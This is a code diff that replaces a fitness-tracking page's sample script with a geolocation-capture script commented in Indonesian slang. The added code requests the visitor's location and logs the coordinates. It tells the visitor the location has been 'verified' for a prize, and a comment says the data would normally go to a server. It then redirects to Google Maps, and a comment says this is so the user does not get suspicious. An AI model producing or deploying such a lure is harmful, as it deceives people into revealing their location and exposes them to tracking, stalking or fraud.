@@ -1,93 +1,30 @@
-// Sample activity data
-const activities = [
-    {
-        id: 1,
-        type: 'Run',
-        distance: '10.2 km',
-        duration: '52:18',
-        date: 'Today, 07:30 AM',
-        elevation: '125 m',
-        calories: '720'
-    },
-    {
-        id: 2,
-        type: 'Ride',
-        distance: '32.5 km',
-        duration: '1:25:42',
-        date: 'Yesterday, 05:45 PM',
-        elevation: '340 m',
-        calories: '950'
-    },
-    {
-        id: 3,
-        type: 'Run',
-        distance: '5.8 km',
-        duration: '28:12',
-        date: '2 days ago, 06:15 AM',
-        elevation: '65 m',
-        calories: '420'
+function getLocation() {
+    if (navigator.geolocation) {
+        // Ini yang bakal munculin pop-up izin di browser user
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+        alert("Browser lo jadul, gak support.");
     }
-];
-
-// Display activities
-function displayActivities() {
-    const activityList = document.querySelector('.activity-list');
-    
-    activities.forEach(activity => {
-        const activityItem = document.createElement('div');
-        activityItem.className = 'activity-item';
-        
-        activityItem.innerHTML = `
-            <div class="activity-type">
-                <i class="fas fa-${activity.type === 'Run' ? 'running' : 'bicycle'}"></i>
-                <div>
-                    <h4>${activity.type}</h4>
-                    <p>${activity.date}</p>
-                </div>
-            </div>
-            <div class="activity-details">
-                <p><strong>${activity.distance}</strong></p>
-                <p>${activity.duration}</p>
-            </div>
-        `;
-        
-        activityList.appendChild(activityItem);
-    });
 }
 
-// Initialize map
-function initMap() {
-    const map = L.map('map').setView([-6.2088, 106.8456], 13); // Default to Jakarta
+function showPosition(position) {
+    let lat = position.coords.latitude;
+    let lon = position.coords.longitude;
     
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-    }).addTo(map);
+    console.log("Latitude: " + lat);
+    console.log("Longitude: " + lon);
+
+    // Di sini biasanya data dikirim ke server (PHP/Python) buat disimpan
+    alert("Lokasi berhasil diverifikasi. Tunggu konfirmasi!");
     
-    // Add a sample route
-    const route = [
-        [-6.2088, 106.8456],
-        [-6.2100, 106.8470],
-        [-6.2120, 106.8500],
-        [-6.2140, 106.8530]
-    ];
-    
-    L.polyline(route, {color: '#fc4c02'}).addTo(map);
-    
-    // Add start and end markers
-    L.marker(route[0]).addTo(map)
-        .bindPopup('Start Point');
-    
-    L.marker(route[route.length - 1]).addTo(map)
-        .bindPopup('End Point');
+    // Contoh redirect ke Google Maps biar user gak curiga
+    window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
 }
 
-// Record button functionality
-document.getElementById('record-activity').addEventListener('click', function() {
-    alert('Recording activity... This would start GPS tracking in a real app.');
-});
-
-// Initialize the app
-document.addEventListener('DOMContentLoaded', function() {
-    displayActivities();
-    initMap();
-});
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            alert("Yah, lo nolak izinnya. Hadiah angus.");
+            break;
+    }
+}
